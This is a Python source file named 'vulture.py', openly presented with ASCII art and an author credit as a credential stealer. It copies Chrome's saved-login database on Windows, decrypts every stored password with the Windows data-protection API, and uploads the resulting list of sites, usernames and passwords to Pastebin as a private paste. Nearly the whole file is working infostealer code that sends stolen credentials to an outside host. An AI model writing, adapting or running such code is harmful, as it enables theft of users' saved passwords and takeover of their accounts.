import sqlite3, win32crypt, getpass, os, argparse
import urllib.parse, urllib.request
from tempfile import gettempdir
from subprocess import Popen
from shutil import copy

class Bird:


	pastebin_key = 'PASTEBIN API KEY'
	payload = ''

	def pluck_passwords(self):

		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.getlogin())

		# Copies the chrome database over to the temporary directory.
		copy(PATH, gettempdir())

		# SQLite Connection
		temp = gettempdir() + '//Login Data'
		conn = sqlite3.connect(PATH + temp)
		cur = conn.cursor()

		user_data = None

		try:
			cur.execute('SELECT action_url, username_value, password_value FROM logins')
			user_data = cur.fetchall()
		except Exception:
			print('\nError fetching passwords.')

		for r in user_data:
			password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]

			password = password.decode("utf-8")
			username = r[1]
			host = r[0]

			# Creates a string for each website / username / password combination
			result = '{0}\n\t{1}\n\t{2}\n\n'.format(host, username, password)

			# Adds each result to the payload, ready to be uploaded.
			self.payload += result

	def upload_to_pastebin(self):
		 
		values = {
			'api_dev_key': self.pastebin_key,
			'api_option': 'paste',
			'api_paste_code' : self.payload,
			'api_paste_private' : '1',
			'api_paste_name' : 'vulture.py | {}'.format(os.getlogin()),
			'api_paste_expire_date' : 'N',
			'api_paste_format' : 'python',
		}
		
		# Encodes the values.
		data = urllib.parse.urlencode(values).encode('utf-8')

		# Sends a HTTP request to pastebin API.
		req = urllib.request.Request('http://pastebin.com/api/api_post.php', data)

		with urllib.request.urlopen(req) as response:
		    page = response.read()

		return page.decode('utf-8')

def main():

	print('''
       .-'`\-,/^\ .-.
      /    |  \  ( ee\   __
     |     |  |__/,--.`"`  `,
     |    /   .__/    `"""",/
     |   /    /  |
    .'.-'    /__/
   `"`| |';-;_`
	  |/ /-))))))


	Vulture.py written by Beagerr.

	https://www.github.com/beagerr/vulture.py
	  ''')

	vulture = Bird()
	vulture.pluck_passwords()
	os.system('start {}'.format(vulture.upload_to_pastebin()))


if __name__ == '__main__':
	main()
